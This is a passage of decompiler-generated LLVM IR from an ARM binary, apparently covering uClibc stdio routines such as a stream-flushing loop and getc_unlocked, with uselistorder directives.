  store i1 %v3_167a4, i1* %cpsr_c.global-to-local, align 1
  %v9_167a4 = icmp eq i32 %v0_167ac, %v1_167a4
  br i1 %v9_167a4, label %dec_label_pc_167ac, label %dec_label_pc_167a4.dec_label_pc_16774_crit_edge

dec_label_pc_167a4.dec_label_pc_16774_crit_edge:  ; preds = %dec_label_pc_167a4
  %v0_16774.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16774

dec_label_pc_167ac:                               ; preds = %dec_label_pc_167a4
  %v2_167ac = icmp ne i32 %v1_167a4, 0
  store i1 %v2_167ac, i1* %cpsr_c.global-to-local, align 1
  %v7_167b0 = icmp slt i32 %v1_167a4, 2
  br i1 %v7_167b0, label %dec_label_pc_167ccthread-pre-split, label %dec_label_pc_167b4

dec_label_pc_167b4:                               ; preds = %dec_label_pc_167ac
  %v0_167b4 = load i32, i32* @r7, align 4
  store i32 %v0_167b4, i32* %r0.global-to-local, align 4
  %v0_167b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_167b8 = add i32 %v0_167b8, 129
  store i32 %v1_167b8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167ccthread-pre-split

dec_label_pc_167ccthread-pre-split:               ; preds = %dec_label_pc_167ac, %dec_label_pc_167b4
  %v0_16918.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_167cc

dec_label_pc_167cc:                               ; preds = %dec_label_pc_167ccthread-pre-split, %dec_label_pc_1674c
  %v0_16918.pr = phi i32 [ %v0_16918.pr.pr, %dec_label_pc_167ccthread-pre-split ], [ %v2_16764, %dec_label_pc_1674c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1691818 = icmp eq i32 %v0_16918.pr, 0
  br i1 %v2_1691818, label %dec_label_pc_16920, label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167cc, %dec_label_pc_16914
  %v0_16804 = phi i32 [ %v3_16914, %dec_label_pc_16914 ], [ %v0_16918.pr, %dec_label_pc_167cc ]
  %v1_167dc = inttoptr i32 %v0_16804 to i16*
  %v2_167dc = load i16, i16* %v1_167dc, align 2
  %v3_167dc = zext i16 %v2_167dc to i32
  store i32 %v3_167dc, i32* %r3.global-to-local, align 4
  %v1_167e0 = and i32 %v3_167dc, 64
  %v2_167e0 = icmp eq i32 %v1_167e0, 0
  br i1 %v2_167e0, label %dec_label_pc_16914, label %dec_label_pc_167e8

dec_label_pc_167e8:                               ; preds = %dec_label_pc_167dc
  %v0_167e8 = load i32, i32* @r6, align 4
  %v1_167e8 = load i32, i32* %sb.global-to-local, align 4
  %v2_167e8 = add i32 %v1_167e8, %v0_167e8
  %v3_167e8 = inttoptr i32 %v2_167e8 to i32*
  %v4_167e8 = load i32, i32* %v3_167e8, align 4
  store i32 %v4_167e8, i32* %r3.global-to-local, align 4
  %v1_167ec = inttoptr i32 %v4_167e8 to i32*
  %v2_167ec = load i32, i32* %v1_167ec, align 4
  store i32 %v2_167ec, i32* %r3.global-to-local, align 4
  %v2_167f0 = icmp ugt i32 %v2_167ec, 1
  store i1 %v2_167f0, i1* %cpsr_c.global-to-local, align 1
  %v7_167f0 = icmp eq i32 %v2_167ec, 2
  br i1 %v7_167f0, label %dec_label_pc_16854, label %dec_label_pc_167f8

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167e8
  %v1_167f8 = add i32 %v0_16804, 64
  %v2_167f8 = inttoptr i32 %v1_167f8 to i32*
  %v3_167f8 = load i32, i32* %v2_167f8, align 4
  store i32 %v3_167f8, i32* %r3.global-to-local, align 4
  %v1_167fc = load i32, i32* %r8.global-to-local, align 4
  %v3_167fc = icmp uge i32 %v3_167f8, %v1_167fc
  store i1 %v3_167fc, i1* %cpsr_c.global-to-local, align 1
  %v9_167fc = icmp eq i32 %v3_167f8, %v1_167fc
  br i1 %v9_167fc, label %dec_label_pc_16848, label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %dec_label_pc_167f8
  %v1_16804 = add i32 %v0_16804, 56
  store i32 %v1_16804, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16804, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1681486 = inttoptr i32 %v1_16804 to i32*
  %v2_1681487 = load i32, i32* %v1_1681486, align 4
  store i32 %v2_1681487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1681894 = icmp eq i32 %v2_1681487, 0
  br i1 %v9_1681894, label %dec_label_pc_16820, label %dec_label_pc_16838

dec_label_pc_16820:                               ; preds = %dec_label_pc_16804, %dec_label_pc_16820.dec_label_pc_16814_crit_edge
  %v0_1682095 = phi i32 [ %v1_16818.pre, %dec_label_pc_16820.dec_label_pc_16814_crit_edge ], [ 0, %dec_label_pc_16804 ]
  store i32 %v0_1682095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16830 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16830, label %dec_label_pc_16834, label %dec_label_pc_16820.dec_label_pc_16814_crit_edge

dec_label_pc_16820.dec_label_pc_16814_crit_edge:  ; preds = %dec_label_pc_16820
  %v0_16814.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16818.pre = load i32, i32* @r4, align 4
  %v1_16814 = inttoptr i32 %v0_16814.pre to i32*
  %v2_16814 = load i32, i32* %v1_16814, align 4
  store i32 %v2_16814, i32* %r3.global-to-local, align 4
  %v3_16818 = icmp uge i32 %v2_16814, %v1_16818.pre
  store i1 %v3_16818, i1* %cpsr_c.global-to-local, align 1
  %v9_16818 = icmp eq i32 %v2_16814, %v1_16818.pre
  br i1 %v9_16818, label %dec_label_pc_16820, label %dec_label_pc_16838

dec_label_pc_16834:                               ; preds = %dec_label_pc_16820
  %v0_16834 = load i32, i32* @r4, align 4
  store i32 %v0_16834, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16838

dec_label_pc_16838:                               ; preds = %dec_label_pc_16804, %dec_label_pc_16820.dec_label_pc_16814_crit_edge, %dec_label_pc_16834
  %v0_16838 = phi i32 [ %v0_16834, %dec_label_pc_16834 ], [ %v2_1681487, %dec_label_pc_16804 ], [ %v2_16814, %dec_label_pc_16820.dec_label_pc_16814_crit_edge ]
  %v1_16838 = phi i32 [ %v0_16834, %dec_label_pc_16834 ], [ 0, %dec_label_pc_16804 ], [ %v1_16818.pre, %dec_label_pc_16820.dec_label_pc_16814_crit_edge ]
  %v3_16838 = icmp uge i32 %v0_16838, %v1_16838
  store i1 %v3_16838, i1* %cpsr_c.global-to-local, align 1
  %v9_16838 = icmp eq i32 %v0_16838, %v1_16838
  br i1 %v9_16838, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_16838
  %v1_1683c = load i32, i32* @r7, align 4
  store i32 %v1_1683c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_16838, %bb69
  %v1_16840 = xor i1 %v9_16838, true
  call void @__pseudo_cond_branch(i1 %v1_16840, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_16844 = load i32, i32* %r8.global-to-local, align 4
  %v1_16844 = load i32, i32* @r5, align 4
  %v2_16844 = add i32 %v1_16844, 64
  %v3_16844 = inttoptr i32 %v2_16844 to i32*
  store i32 %v0_16844, i32* %v3_16844, align 4
  %v0_16848.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %dec_label_pc_167f8, %bb70
  %v0_16848 = phi i32 [ %v0_16804, %dec_label_pc_167f8 ], [ %v0_16848.pre, %bb70 ]
  %v1_16848 = add i32 %v0_16848, 60
  %v2_16848 = inttoptr i32 %v1_16848 to i32*
  %v3_16848 = load i32, i32* %v2_16848, align 4
  %v1_1684c = add i32 %v3_16848, 1
  store i32 %v1_1684c, i32* %r3.global-to-local, align 4
  store i32 %v1_1684c, i32* %v2_16848, align 4
  %v0_16854.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16854

dec_label_pc_16854:                               ; preds = %dec_label_pc_167e8, %dec_label_pc_16848
  %v0_1686c = phi i32 [ %v0_16804, %dec_label_pc_167e8 ], [ %v0_16854.pre, %dec_label_pc_16848 ]
  %v1_16854 = inttoptr i32 %v0_1686c to i16*
  %v2_16854 = load i16, i16* %v1_16854, align 2
  %v3_16854 = zext i16 %v2_16854 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1685c = or i32 %v3_16854, %stack_var_-44.1
  %v1_16860 = xor i32 %v2_1685c, 320
  store i32 %v1_16860, i32* %r3.global-to-local, align 4
  %v1_16864 = and i32 %v1_16860, 832
  %v2_16864 = icmp eq i32 %v1_16864, 0
  br i1 %v2_16864, label %dec_label_pc_1686c, label %bb71

dec_label_pc_1686c:                               ; preds = %dec_label_pc_16854
  store i32 %v0_1686c, i32* %r0.global-to-local, align 4
  %v1_16870 = call i32 @__stdio_wcommit(i32 %v0_1686c)
  store i32 %v1_16870, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16874 = icmp eq i32 %v1_16870, 0
  br i1 %v2_16874, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1686c
  %v1_16878 = load i32, i32* @r5, align 4
  %v2_16878 = inttoptr i32 %v1_16878 to i16*
  %v3_16878 = load i16, i16* %v2_16878, align 2
  %v4_16878 = zext i16 %v3_16878 to i32
  store i32 %v4_16878, i32* %r3.global-to-local, align 4
  %v2_1687c = add i32 %v1_16878, 8
  %v3_1687c = inttoptr i32 %v2_1687c to i32*
  %v4_1687c = load i32, i32* %v3_1687c, align 4
  store i32 %v4_1687c, i32* %r2.global-to-local, align 4
  %v2_16880 = and i32 %v4_16878, 65471
  store i32 %v2_16880, i32* %r3.global-to-local, align 4
  %v3_16884 = add i32 %v1_16878, 28
  %v4_16884 = inttoptr i32 %v3_16884 to i32*
  store i32 %v4_1687c, i32* %v4_16884, align 4
  %v1_16888 = load i32, i32* %r3.global-to-local, align 4
  %v2_16888 = trunc i32 %v1_16888 to i16
  %v3_16888 = load i32, i32* @r5, align 4
  %v4_16888 = inttoptr i32 %v3_16888 to i16*
  store i16 %v2_16888, i16* %v4_16888, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1686c
  %v1_1688c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1688c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_16854, %.thread7
  %v0_16890 = load i32, i32* @r6, align 4
  %v1_16890 = load i32, i32* %sb.global-to-local, align 4
  %v2_16890 = add i32 %v1_16890, %v0_16890
  %v3_16890 = inttoptr i32 %v2_16890 to i32*
  %v4_16890 = load i32, i32* %v3_16890, align 4
  store i32 %v4_16890, i32* %r3.global-to-local, align 4
  %v1_16894 = inttoptr i32 %v4_16890 to i32*
  %v2_16894 = load i32, i32* %v1_16894, align 4
  store i32 %v2_16894, i32* %r3.global-to-local, align 4
  %v2_16898 = icmp ugt i32 %v2_16894, 1
  store i1 %v2_16898, i1* %cpsr_c.global-to-local, align 1
  %v7_16898 = icmp eq i32 %v2_16894, 2
  br i1 %v7_16898, label %dec_label_pc_16914, label %dec_label_pc_168a0

dec_label_pc_168a0:                               ; preds = %bb71
  %v0_168a0 = load i32, i32* @r5, align 4
  %v1_168a0 = add i32 %v0_168a0, 60
  %v2_168a0 = inttoptr i32 %v1_168a0 to i32*
  %v3_168a0 = load i32, i32* %v2_168a0, align 4
  %v1_168a4 = add i32 %v3_168a0, -1
  store i32 %v1_168a4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168a8 = icmp eq i32 %v1_168a4, 0
  store i32 %v1_168a4, i32* %v2_168a0, align 4
  br i1 %v2_168a8, label %dec_label_pc_168b4, label %dec_label_pc_16914

dec_label_pc_168b4:                               ; preds = %dec_label_pc_168a0
  %v0_168b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_168b4 = load i32, i32* @r5, align 4
  %v2_168b4 = add i32 %v1_168b4, 64
  %v3_168b4 = inttoptr i32 %v2_168b4 to i32*
  store i32 %v0_168b4, i32* %v3_168b4, align 4
  %v0_168b8 = load i32, i32* @r5, align 4
  %v1_168b8 = add i32 %v0_168b8, 56
  store i32 %v1_168b8, i32* @r7, align 4
  br label %dec_label_pc_168bc

dec_label_pc_168bc:                               ; preds = %dec_label_pc_168ec.dec_label_pc_168bc_crit_edge, %dec_label_pc_168b4
  %v0_168c4 = phi i32 [ %v0_168c4.pre, %dec_label_pc_168ec.dec_label_pc_168bc_crit_edge ], [ %v1_168b8, %dec_label_pc_168b4 ]
  %v0_168bc = phi i32 [ %v0_168bc.pre, %dec_label_pc_168ec.dec_label_pc_168bc_crit_edge ], [ %v0_168b8, %dec_label_pc_168b4 ]
  %v1_168bc = add i32 %v0_168bc, 56
  %v2_168bc = inttoptr i32 %v1_168bc to i32*
  %v3_168bc = load i32, i32* %v2_168bc, align 4
  store i32 %v3_168bc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_168c4, i32* %r2.global-to-local, align 4
  %v1_168c897 = inttoptr i32 %v0_168c4 to i32*
  %v2_168c898 = load i32, i32* %v1_168c897, align 4
  store i32 %v2_168c898, i32* %r3.global-to-local, align 4
  %v3_168cc100 = icmp uge i32 %v2_168c898, %v3_168bc
  store i1 %v3_168cc100, i1* %cpsr_c.global-to-local, align 1
  %v9_168cc106 = icmp eq i32 %v2_168c898, %v3_168bc
  br i1 %v9_168cc106, label %dec_label_pc_168d4, label %dec_label_pc_168ec

dec_label_pc_168d4:                               ; preds = %dec_label_pc_168bc, %dec_label_pc_168d4.dec_label_pc_168c8_crit_edge
  %v0_168d4107 = phi i32 [ %v1_168cc.pre, %dec_label_pc_168d4.dec_label_pc_168c8_crit_edge ], [ %v3_168bc, %dec_label_pc_168bc ]
  store i32 %v0_168d4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_168e4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_168e4, label %dec_label_pc_168e8, label %dec_label_pc_168d4.dec_label_pc_168c8_crit_edge

dec_label_pc_168d4.dec_label_pc_168c8_crit_edge:  ; preds = %dec_label_pc_168d4
  %v0_168c8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_168cc.pre = load i32, i32* @r4, align 4
  %v1_168c8 = inttoptr i32 %v0_168c8.pre to i32*
  %v2_168c8 = load i32, i32* %v1_168c8, align 4
  store i32 %v2_168c8, i32* %r3.global-to-local, align 4
  %v3_168cc = icmp uge i32 %v2_168c8, %v1_168cc.pre
  store i1 %v3_168cc, i1* %cpsr_c.global-to-local, align 1
  %v9_168cc = icmp eq i32 %v2_168c8, %v1_168cc.pre
  br i1 %v9_168cc, label %dec_label_pc_168d4, label %dec_label_pc_168ec

dec_label_pc_168e8:                               ; preds = %dec_label_pc_168d4
  %v0_168e8 = load i32, i32* @r4, align 4
  store i32 %v0_168e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_168ec

dec_label_pc_168ec:                               ; preds = %dec_label_pc_168bc, %dec_label_pc_168d4.dec_label_pc_168c8_crit_edge, %dec_label_pc_168e8
  %v0_168f4 = phi i32 [ %v0_168e8, %dec_label_pc_168e8 ], [ %v2_168c898, %dec_label_pc_168bc ], [ %v2_168c8, %dec_label_pc_168d4.dec_label_pc_168c8_crit_edge ]
  %v1_168ec = phi i32 [ %v0_168e8, %dec_label_pc_168e8 ], [ %v3_168bc, %dec_label_pc_168bc ], [ %v1_168cc.pre, %dec_label_pc_168d4.dec_label_pc_168c8_crit_edge ]
  %v3_168ec = icmp uge i32 %v0_168f4, %v1_168ec
  store i1 %v3_168ec, i1* %cpsr_c.global-to-local, align 1
  %v9_168ec = icmp eq i32 %v0_168f4, %v1_168ec
  br i1 %v9_168ec, label %dec_label_pc_168f4, label %dec_label_pc_168ec.dec_label_pc_168bc_crit_edge

dec_label_pc_168ec.dec_label_pc_168bc_crit_edge:  ; preds = %dec_label_pc_168ec
  %v0_168bc.pre = load i32, i32* @r5, align 4
  %v0_168c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_168bc

dec_label_pc_168f4:                               ; preds = %dec_label_pc_168ec
  %v2_168f4 = icmp ne i32 %v1_168ec, 0
  store i1 %v2_168f4, i1* %cpsr_c.global-to-local, align 1
  %v7_168f8 = icmp slt i32 %v1_168ec, 2
  br i1 %v7_168f8, label %dec_label_pc_16914, label %dec_label_pc_168fc

dec_label_pc_168fc:                               ; preds = %dec_label_pc_168f4
  %v0_168fc = load i32, i32* @r5, align 4
  %v1_168fc = add i32 %v0_168fc, 56
  store i32 %v1_168fc, i32* %r0.global-to-local, align 4
  %v0_16900 = load i32, i32* %r1.global-to-local, align 4
  %v1_16900 = add i32 %v0_16900, 129
  store i32 %v1_16900, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16914

dec_label_pc_16914:                               ; preds = %dec_label_pc_168a0, %dec_label_pc_168fc, %dec_label_pc_168f4, %bb71, %dec_label_pc_167dc
  %v0_16914 = load i32, i32* @r5, align 4
  %v1_16914 = add i32 %v0_16914, 32
  %v2_16914 = inttoptr i32 %v1_16914 to i32*
  %v3_16914 = load i32, i32* %v2_16914, align 4
  store i32 %v3_16914, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16918 = icmp eq i32 %v3_16914, 0
  br i1 %v2_16918, label %dec_label_pc_16920, label %dec_label_pc_167dc

dec_label_pc_16920:                               ; preds = %dec_label_pc_16914, %dec_label_pc_167cc
  %v0_16920 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_16920, i32* %r0.global-to-local, align 4
  %v0_1695c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16928:                               ; preds = %dec_label_pc_16604
  %v3_16928 = load i16, i16* %arg1, align 2
  %v4_16928 = zext i16 %v3_16928 to i32
  %v1_1692c = and i32 %v4_16928, 64
  store i32 %v1_1692c, i32* %r3.global-to-local, align 4
  %v2_1692c = icmp eq i32 %v1_1692c, 0
  br i1 %v2_1692c, label %bb72, label %dec_label_pc_16938

bb72:                                             ; preds = %dec_label_pc_16928
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16938:                               ; preds = %dec_label_pc_16928
  %v2_16938 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_16938, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1693c = icmp eq i32 %v2_16938, 0
  br i1 %v2_1693c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_16938
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_16938
  %v1_16940 = load i32, i32* @r4, align 4
  %v2_16940 = inttoptr i32 %v1_16940 to i16*
  %v3_16940 = load i16, i16* %v2_16940, align 2
  %v4_16940 = zext i16 %v3_16940 to i32
  store i32 %v4_16940, i32* %r3.global-to-local, align 4
  %v2_16944 = add i32 %v1_16940, 8
  %v3_16944 = inttoptr i32 %v2_16944 to i32*
  %v4_16944 = load i32, i32* %v3_16944, align 4
  store i32 %v4_16944, i32* %r2.global-to-local, align 4
  %v2_16948 = and i32 %v4_16940, 65471
  store i32 %v2_16948, i32* %r3.global-to-local, align 4
  %v2_1694c = trunc i32 %v2_16948 to i16
  store i16 %v2_1694c, i16* %v2_16940, align 2
  %v1_16950 = load i32, i32* %r2.global-to-local, align 4
  %v2_16950 = load i32, i32* @r4, align 4
  %v3_16950 = add i32 %v2_16950, 28
  %v4_16950 = inttoptr i32 %v3_16950 to i32*
  store i32 %v1_16950, i32* %v4_16950, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_16920, %.thread14
  %v0_1695c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1695c.pre, %dec_label_pc_16920 ], [ 0, %.thread14 ]
  store i32 %v0_1695c, i32* %r0.global-to-local, align 4
  store i32 %v6_165d8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1695c

; uselistorder directives
  uselistorder i32 %v0_1695c, { 1, 0 }
  uselistorder i32 %v3_16914, { 1, 2, 0 }
  uselistorder i32 %v0_168e8, { 1, 0, 2 }
  uselistorder i32 %v1_168cc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1686c, { 1, 0, 2 }
  uselistorder i32 %v0_16834, { 1, 0, 2 }
  uselistorder i32 %v1_16818.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_167fc, { 1, 0 }
  uselistorder i32 %v0_167a0, { 1, 0, 2 }
  uselistorder i32 %v1_16784.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16774, { 1, 0 }
  uselistorder i32 %v0_16738, { 1, 0, 2 }
  uselistorder i32 %v1_1671c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16704, { 1, 0 }
  uselistorder i32 %v0_166cc, { 1, 0, 2 }
  uselistorder i32 %v1_166b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_166a0, { 1, 0 }
  uselistorder i32 %v0_1665c, { 1, 0, 2 }
  uselistorder i32 %v1_16640.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16618, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 6, 7, 9, 8, 55, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 54, 22, 23, 24, 25, 26, 27, 29, 28, 5, 30, 31, 32, 33, 35, 34, 1, 36, 37, 38, 39, 41, 40, 53, 42, 43, 44, 45, 47, 46, 0, 48, 49, 52, 50, 51 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 14, 4, 5, 6, 38, 39, 7, 8, 9, 10, 11, 36, 37, 12, 13, 40, 15, 16, 17, 34, 35, 18, 19, 21, 20, 2, 22, 23, 24, 26, 25, 0, 27, 28, 30, 29, 1, 31, 32, 33 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16914, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_168ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_168d4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16854, { 1, 0 }
  uselistorder label %dec_label_pc_16848, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_16838, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16820, { 1, 0 }
  uselistorder label %dec_label_pc_167dc, { 1, 0 }
  uselistorder label %dec_label_pc_167ccthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_167a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1678c, { 1, 0 }
  uselistorder label %dec_label_pc_1674c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1673c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16724, { 1, 0 }
  uselistorder label %dec_label_pc_166f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_166d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166b8, { 1, 0 }
  uselistorder label %dec_label_pc_16670, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16660, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16648, { 1, 0 }
  uselistorder label %dec_label_pc_16614, { 1, 0 }
}

define i32 @function_16970(i32 %arg1) local_unnamed_addr {
dec_label_pc_16970:
  %v0_16970 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16970, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16970
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16970, %bb
  %v10_16980 = phi i32 [ %arg1, %dec_label_pc_16970 ], [ 0, %bb ]
  ret i32 %v10_16980

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16984 = load i32, i32* @r4, align 4
  store i32 %v3_16984, i32* %stack_var_-12, align 4
  %v6_16984 = load i32, i32* @r5, align 4
  %v9_16984 = load i32, i32* @lr, align 4
  %v0_16988 = load i32, i32* @r0, align 4
  %v1_16988 = add i32 %v0_16988, 16
  %v2_16988 = inttoptr i32 %v1_16988 to i32*
  %v3_16988 = load i32, i32* %v2_16988, align 4
  store i32 %v3_16988, i32* %r2.global-to-local, align 4
  %v1_1698c = add i32 %v0_16988, 24
  %v2_1698c = inttoptr i32 %v1_1698c to i32*
  %v3_1698c = load i32, i32* %v2_1698c, align 4
  %v3_16990 = icmp ult i32 %v3_16988, %v3_1698c
  store i32 %v0_16988, i32* @r4, align 4
  br i1 %v3_16990, label %bb, label %dec_label_pc_169b0

bb:                                               ; preds = %entry
  %v2_1699c = inttoptr i32 %v3_16988 to i8*
  %v3_1699c = load i8, i8* %v2_1699c, align 1
  %v4_1699c = zext i8 %v3_1699c to i32
  store i32 %v4_1699c, i32* %r0.global-to-local, align 4
  %v6_1699c = add i32 %v3_16988, 1
  store i32 %v6_1699c, i32* %r2.global-to-local, align 4
  store i32 %v6_1699c, i32* %v2_16988, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_169b0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r5, align 4
  %v1_169b0 = inttoptr i32 %v0_16988 to i16*
  %v2_169b0 = load i16, i16* %v1_169b0, align 2
  %v3_169b0 = zext i16 %v2_169b0 to i32
  %v1_169b4 = and i32 %v3_169b0, 131
  %tmp25 = icmp ugt i32 %v1_169b4, 128
  br i1 %tmp25, label %dec_label_pc_169d0, label %dec_label_pc_169c0

dec_label_pc_169c0:                               ; preds = %dec_label_pc_169b0
  store i32 128, i32* @r1, align 4
  %v0_169c4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_169c4, i32* %r0.global-to-local, align 4
  %v2_169c8 = icmp eq i32 %v0_169c4, 0
  br i1 %v2_169c8, label %dec_label_pc_169c0.dec_label_pc_169d0_crit_edge, label %dec_label_pc_16a98

dec_label_pc_169c0.dec_label_pc_169d0_crit_edge:  ; preds = %dec_label_pc_169c0
  %v0_169d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169c0.dec_label_pc_169d0_crit_edge, %dec_label_pc_169b0
  %v2_16a10 = phi i32 [ %v0_169d0.pre, %dec_label_pc_169c0.dec_label_pc_169d0_crit_edge ], [ %v0_16988, %dec_label_pc_169b0 ]
  %v1_169d0 = inttoptr i32 %v2_16a10 to i16*
  %v2_169d0 = load i16, i16* %v1_169d0, align 2
  %v3_169d0 = zext i16 %v2_169d0 to i32
  store i32 %v3_169d0, i32* %r2.global-to-local, align 4
  %v1_169d4 = and i32 %v3_169d0, 2
  %v2_169d4 = icmp eq i32 %v1_169d4, 0
  br i1 %v2_169d4, label %dec_label_pc_16a00, label %dec_label_pc_169dc

dec_label_pc_169dc:                               ; preds = %dec_label_pc_169d0
  %tmp26 = urem i16 %v2_169d0, 2
  %v1_169dc = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_169dc
  %v4_169e0 = and i32 %tmp22, 4
  %v5_169e0 = add i32 %v4_169e0, %v2_16a10
  %v1_169e4 = add i32 %v5_169e0, 36
  %v2_169e4 = inttoptr i32 %v1_169e4 to i8*
